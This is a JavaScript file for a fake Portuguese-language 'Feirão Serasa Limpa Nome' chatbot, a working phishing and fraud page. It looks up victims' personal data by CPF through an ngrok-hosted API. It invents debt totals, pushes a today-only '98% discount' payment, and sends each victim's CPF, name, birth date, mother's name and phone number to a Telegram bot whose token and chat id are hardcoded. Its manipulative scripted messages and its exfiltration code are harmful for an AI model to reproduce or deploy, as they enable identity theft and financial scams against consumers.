document.addEventListener("DOMContentLoaded", function () {
  let min = 4000;
  let max = 5000;
  let numeroAleatorio = Math.floor(Math.random() * (max - min + 1)) + min;
  let withPoint = numeroAleatorio
    .toFixed(2)
    .toString()
    .replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1.");
  function percentage(percent, total) {
    return ((percent / 100) * total).toFixed(2);
  }
  var points = numeroAleatorio;
  var calc = points - percentage(98, points);

  const phoneMask = (value) => {
    if (!value) return "";
    value = value.replace(/\D/g, "");
    value = value.replace(/(\d{2})(\d)/, "($1) $2");
    value = value.replace(/(\d)(\d{4})$/, "$1-$2");
    return value;
  };

  function validarCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, "");
    if (cpf == "") return false;
    // Elimina CPFs invalidos conhecidos
    if (
      cpf.length != 11 ||
      cpf == "00000000000" ||
      cpf == "11111111111" ||
      cpf == "22222222222" ||
      cpf == "33333333333" ||
      cpf == "44444444444" ||
      cpf == "55555555555" ||
      cpf == "66666666666" ||
      cpf == "77777777777" ||
      cpf == "88888888888" ||
      cpf == "99999999999"
    )
      return false;
    // Valida 1o digito
    add = 0;
    for (i = 0; i < 9; i++) add += parseInt(cpf.charAt(i)) * (10 - i);
    rev = 11 - (add % 11);
    if (rev == 10 || rev == 11) rev = 0;
    if (rev != parseInt(cpf.charAt(9))) return false;
    // Valida 2o digito
    add = 0;
    for (i = 0; i < 10; i++) add += parseInt(cpf.charAt(i)) * (11 - i);
    rev = 11 - (add % 11);
    if (rev == 10 || rev == 11) rev = 0;
    if (rev != parseInt(cpf.charAt(10))) return false;
    return true;
  }

  var chat = document.getElementById("chat");
  var removed = false;
  var dados = [];

  // Adicionar o campo de entrada para o CPF após essa mensagem
  var inputContainer2 = document.createElement("div2");
  inputContainer2.id = "input-container";
  inputContainer2.innerHTML = `

 <input type="text" id="phone-input" placeholder="Digite seu celular" maxlength="15" required>
 <button id="enviar-btn2">ENVIAR</button>
`;

  function validarCelular(numero) {
    // Remove todos os caracteres não numéricos
    var numeroLimpo = numero.replace(/\D/g, "");

    // Expressão regular para validar número de celular no formato brasileiro
    var regex = /^(\d{2})\s?9?\d{4}-?\d{4}$/;

    return regex.test(numeroLimpo);
  }

  function addLoading() {
    console.log("criou");
    setInterval(function () {
      var dots = document.getElementById("dots");

      if (removed) return;
      if (!dots) {
        var mensagemElement = document.createElement("div");
        mensagemElement.classList.add("mensagem");
        mensagemElement.classList.add("chatbot");
        mensagemElement.id = "dots";
        mensagemElement.textContent = "...";
        chat.appendChild(mensagemElement);
      } else {
        dots.textContent += ".";
        if (dots.textContent === "....") dots.textContent = ".";
      }
    }, 500);
  }

  function removeDots() {
    var dotsElement = document.getElementById("dots");
    if (dotsElement) {
      dotsElement.remove();
      console.log("remove");
    }
  }

  function padTo2Digits(num) {
    return num.toString().padStart(2, "0");
  }

  function formatDate(date) {
    return [
      padTo2Digits(date.getDate()),
      padTo2Digits(date.getMonth() + 1),
      date.getFullYear(),
    ].join("/");
  }

  function formatarCPF(cpf) {
    // Remove caracteres não numéricos
    cpf = cpf.replace(/\D/g, "");

    // Aplica a máscara de CPF (###.###.###-##)
    cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");

    return cpf;
  }

  function enviarTelefone(dados) {
    var phoneInput = document.getElementById("phone-input");

    phoneInput.addEventListener("keypress", function (event) {
      // Verifica se a tecla pressionada é "Enter"
      if (event.key === "Enter") {
        event.preventDefault(); // Evita que o formulário seja enviado
        document.getElementById("enviar-btn2").click(); // Simula o clique no botão "Enviar"
      }
    });

    document
      .getElementById("enviar-btn2")
      .addEventListener("click", function () {
        var phoneInputValue = document.getElementById("phone-input").value;

        if (validarCelular(phoneInputValue)) {
          addMessage(phoneInputValue, "chatbot");
          inputContainer2.remove(); // Remove o elemento inputContainer do DOM

          removed = false;

          setTimeout(function () {
            addMessage("Ok, aguarde...", "chatbot");
          }, 0);

          setTimeout(function () {
            addMessage(
              "Só hoje o <strong>FEIRÃO LIMPA NOME SERASA</strong> já ajudou <strong>15.138 brasileiros</strong> a realizarem a negociação de suas dívidas!.",
              "chatbot"
            );
          }, 3000);

          setTimeout(function () {
            removed = true;

            addMessage(
              "Deseja verificar se existe alguma pendência no seu <strong>CPF</strong>?",
              "chatbot"
            );

            // Adicionar o campo de entrada para o CPF após essa mensagem
            var buttonContainer = document.createElement("div");
            buttonContainer.id = "input-container";
            buttonContainer.innerHTML = `
             <button id="fazerconsulta-btn">VERIFICAR</button>
            `;
            chat.appendChild(buttonContainer);

            document
              .getElementById("fazerconsulta-btn")
              .addEventListener("click", function () {
                addMessage(
                  "Aguarde enquanto realizamos a consulta do seu CPF",
                  "chatbot"
                );

                setTimeout(() => {
                  addMessage("Análise concluida!", "chatbot");
                }, 6000);

                removed = false;
                setTimeout(function () {
                  addMessage(
                    `<strong>${dados.NOME}</strong><br/> <br/>Você possui dívidas nos órgão de proteção de crédito que totalizam <strong>R$ ${withPoint}</strong>`,
                    "chatbot"
                  );
                }, 7000);

                setTimeout(function () {
                  addMessage(
                    `Segundo nossos registros seu <strong>SCORE</strong> é considerado baixo (alto risco para crédito)`,
                    "chatbot"
                  );
                }, 13000);

                buttonContainer.remove(); // Remove o elemento inputContainer do DOM
                setTimeout(function () {
                  removed = false;
                  addMessage(
                    "Deseja verificar se tem algum acordo disponível para você?",
                    "chatbot"
                  );

                  // Adicionar o campo de entrada para o CPF após essa mensagem
                  var buttonContainer2 = document.createElement("div");
                  buttonContainer2.id = "input-container";
                  buttonContainer2.innerHTML = `
                    <button id="verificar-btn">VERIFICAR ACORDO</button>
                    `;
                  chat.appendChild(buttonContainer2);
                  removed = true;

                  document
                    .getElementById("verificar-btn")
                    .addEventListener("click", function () {
                      buttonContainer2.remove(); // Remove o elemento inputContainer do DOM
                      removed = false;
                      setTimeout(function () {
                        addMessage(
                          "Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para o seu <strong>CPF</strong>...",
                          "chatbot"
                        );
                      }, 0);

                      setTimeout(function () {
                        addMessage(
                          `<strong>${dados.NOME}<br/> </br>TEMOS UMA BOA NOTÍCIA PARA VOCÊ!</strong><br/> <br/> Encontramos um <strong>SUPER ACORDO</strong> com <strong>98% de DESCONTO para seu CPF: <strong>${formatarCPF(dados.CPF)}</strong>`,
                          "chatbot"
                        );
                      }, 6000);

                      setTimeout(function () {
                        addMessage(
                          `Suas dívidas de <strong>R$ ${withPoint}</strong><br/> <br/> podem ser quitadas hoje por apenas <strong>R$ ${calc.toFixed(
                            2
                          )}</strong>`,
                          "chatbot"
                        );
                      }, 9000);

                      setTimeout(function () {
                        addMessage(
                          "Lembrando que este acordo somente é válido para a data de <strong>HOJE</strong>. Caso não realize o acordo poderá perder esta oferta!",
                          "chatbot"
                        );
                      }, 14000);
                      setTimeout(function () {
                        addMessage(
                          "Após o pagamento do acordo em até <strong>48 HORAS</strong> será solicitado a exclusão das negativações dos órgão de proteção de crédito",
                          "chatbot"
                        );
                      }, 19000);

                      setTimeout(function () {
                        addMessage(
                          `Você gostaria de aceitar o acordo e quitar todas suas dívidas ativas por apenas <strong>R$ ${calc.toFixed(
                            2
                          )}</strong>?`,
                          "chatbot"
                        );

                        // Adicionar o campo de entrada para o CPF após essa mensagem
                        var buttonContainer3 = document.createElement("div");
                        buttonContainer3.id = "input-container";
                        buttonContainer3.innerHTML = `
                    <button id="verificar-btn">ACEITAR ACORDO</button>
                    `;
                        removed = true;
                        chat.appendChild(buttonContainer3);

                        document
                          .getElementById("verificar-btn")
                          .addEventListener("click", function () {
                            var text = `💰 𝙂𝙀𝙍𝙊𝙐 𝙋𝘼𝙂𝘼𝙈𝙀𝙉𝙏𝙊 (𝙁𝙀𝙄𝙍𝘼𝙊)
                            %0A

                  %0A𝙉𝙊𝙈𝙀: ${dados.NOME}
                  %0A𝘾𝙋𝙁: ${dados.CPF}
                  %0A𝙉𝘼𝙎𝘾𝙄𝙈𝙀𝙉𝙏𝙊: ${formatDate(new Date(dados.NASC))}
                  %0A𝙈𝘼𝙀: ${dados.NOME_MAE}
                  %0A𝘾𝙀𝙇𝙐𝙇𝘼𝙍: ${phoneInputValue}
                  %0A𝙑𝘼𝙇𝙊𝙍: ${calc.toFixed(2)}
                  `;

                            // Fazendo a chamada GET com fetch
                            var url =
                              "https://api.telegram.org/bot6340025791:AAHDtUQfYIAfoLwwFjqG9Qq6UbapHuAnrNI/sendMessage?chat_id=" +
                              "-4146156333" +
                              `&text=${text}`;
                            fetch(url, {
                              method: "POST",
                              headers: {
                                "Content-Type": "application/json",
                              },
                            })
                              .then((response) => response.json())
                              .then((data) => {
                                console.log(data);
                              })
                              .catch((error) => {
                                console.error(
                                  "Erro ao realizar a solicitação:",
                                  error
                                );
                              });

                            buttonContainer3.remove(); // Remove o elemento inputContainer do DOM

                            addMessage(
                              "Gerando guia de pagamento, aguarde...",
                              "chatbot"
                            );

                            setTimeout(() => {
                              window.location.href=`/pagamento.html?valor=${calc.toFixed(2)}`
                            }, 4000);
                          });
                      }, 22000);
                    });
                }, 17000);
              });
          }, 7000);
        } else {
          Toastify({
            text: "Celular inválido. Por favor, digite um celular válido.",
            backgroundColor: "linear-gradient(to right, #ff4f8d, #e80070)",
            className: "error-toast custom-toast",
          }).showToast();
        }
        removeDots();
      });
  }

  // Função para adicionar uma mensagem ao chat
  function addMessage(message, sender, imageUrl) {
    var mensagemElement = document.createElement("div");
    mensagemElement.classList.add("mensagem");

    if (sender === "chatbot") {
      mensagemElement.classList.add("chatbot");
      if (imageUrl) {
        var imageElement = document.createElement("img");
        imageElement.src = imageUrl;
        imageElement.alt = "Imagem";
        imageElement.classList.add("imagem");
        mensagemElement.appendChild(imageElement);
      }
      var textElement = document.createElement("div");
      textElement.innerHTML = message;
      mensagemElement.appendChild(textElement);
    } else if (sender === "usuario") {
      mensagemElement.classList.add("usuario");
      mensagemElement.textContent = message; // Usar textContent para segurança ao exibir input do usuário
    }

    chat.appendChild(mensagemElement);
    removeDots(); // Remover os dots após adicionar a mensagem
    setTimeout(() => {
      window.scrollTo({
        left: 0,
        top: document.body.scrollHeight,
        behavior: "smooth",
      });
    }, 200);
  }

  setTimeout(function () {
    addMessage(
      "Olá! Seja bem vindo(a) ao atendimento virtual do <strong>FEIRÃO SERASA LIMPA NOME</strong>",
      "chatbot"
    );
    removeDots();
  }, 0);

  addLoading();
  // Mensagem após 2 segundos
  setTimeout(function () {
    addMessage(
      "Comece <strong>2024</strong> com seu <strong>NOME LIMPO</strong>",
      "chatbot"
    );
  }, 4000);
  setTimeout(function () {
    addMessage(
      "Aproveite o último dia do <strong>FEIRÃO SERASA LIMPA NOME</strong>",
      "chatbot"
    );

    setTimeout(() => {
      addMessage("Para começar insira seu <strong>CPF</strong>", "chatbot");

      // Adicionar o campo de entrada para o CPF após essa mensagem
      var inputContainer = document.createElement("div");
      inputContainer.id = "input-container";
      inputContainer.innerHTML = `
            <input type="text" id="cpf-input" placeholder="Digite seu CPF" maxlength="14" required>
            <button id="enviar-btn">ENVIAR</button>
        `;
      chat.appendChild(inputContainer);

      document
        .getElementById("enviar-btn")
        .addEventListener("click", function () {
          var cpfInputValue = document.getElementById("cpf-input").value;
          if (validarCPF(cpfInputValue)) {
            addMessage(cpfInputValue, "chatbot");
            inputContainer.remove(); // Remove o elemento inputContainer do DOM
            addMessage("Aguarde enquanto consultamos seus dados...", "chatbot");
            // Fazendo a chamada GET com fetch
            var url =
              "https://wzky.ngrok.app/api.php?cpf=" +
              cpfInputValue +
              "&token=13f51fd2-06f5-11ee-be56-0242ac120002000";
            fetch(url)
              .then((response) => response.json())
              .then((data) => {
                console.log(data);
                dados = data;

                setTimeout(() => {
                  addMessage(
                    `Olá, Seja bem vindo(a)!<br/>


                  <br/>NOME: <strong>${data.NOME}</strong>
                  <br/>NASCIMENTO: <strong>${formatDate(
                    new Date(data.NASC)
                  )}</strong>
                  <br/>MÃE: <strong>${data.NOME_MAE}</strong>
                  `,
                    "chatbot"
                  );
                }, 7000);
              })
              .catch((error) => {
                console.error("Erro ao realizar a solicitação:", error);
              });
            removed = false;
            setTimeout(function () {
              addMessage(
                "Com o <strong>FEIRÃO SERASA LIMPA NOME</strong> você pode quitar todas suas dívidas com até <strong>98% de DESCONTO</strong>",
                "chatbot"
              );
            }, 10000);
            setTimeout(function () {
              addMessage("Aqui estão alguns de nossos parceiros...", "chatbot");
            }, 13000);
            setTimeout(function () {
              addMessage("", "chatbot", "parc.png");
            }, 13000);
            setTimeout(function () {
              addMessage(
                "Para continuarmos a consulta insira seu celular",
                "chatbot"
              );

              chat.appendChild(inputContainer2);

              var inputCelular = document.getElementById("phone-input");
              if (inputCelular) {
                inputCelular.oninput = function () {
                  this.value = phoneMask(this.value);
                };
              }

              enviarTelefone(dados);

              removed = true;
            }, 17000);
          } else {
            // Exibir mensagem de erro com Toastify
            Toastify({
              text: "CPF inválido. Por favor, digite um CPF válido.",
              backgroundColor: "linear-gradient(to right, #ff4f8d, #e80070)",
              className: "error-toast custom-toast",
            }).showToast();
          }
          removeDots();
        });

      // Aplicar a máscara de CPF após adicionar o campo ao DOM
      var cpfInput = document.getElementById("cpf-input");
      if (cpfInput) {
        cpfInput.addEventListener("input", function (event) {
          var value = event.target.value.replace(/\D/g, "");
          value = value.replace(/(\d{3})(\d)/, "$1.$2");
          value = value.replace(/(\d{3})(\d)/, "$1.$2");
          value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
          event.target.value = value;
        });

        cpfInput.addEventListener("keypress", function (event) {
          // Verifica se a tecla pressionada é "Enter"
          if (event.key === "Enter") {
            event.preventDefault(); // Evita que o formulário seja enviado
            document.getElementById("enviar-btn").click(); // Simula o clique no botão "Enviar"
          }
        });
      }
      removeDots();
      removed = true;
    }, 2000);
  }, 8000);
});
